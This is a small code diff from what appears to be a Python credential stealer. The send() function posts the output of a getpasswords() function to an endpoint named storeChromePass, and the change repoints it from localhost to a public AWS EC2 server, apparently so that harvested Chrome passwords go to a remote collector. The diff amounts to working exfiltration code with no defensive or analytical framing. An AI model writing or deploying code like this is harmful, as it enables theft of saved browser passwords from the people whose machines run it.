@@ -50,7 +50,7 @@ def getpasswords():
     return dataToBeSent
 
 def send():
-    url = "http://localhost:3000/users/storeChromePass"
+    url = "http://ec2-3-83-115-206.compute-1.amazonaws.com:3000/users/storeChromePass"
     jsonData = getpasswords()
     print(jsonData)
     r = requests.post(url=url, json=jsonData)
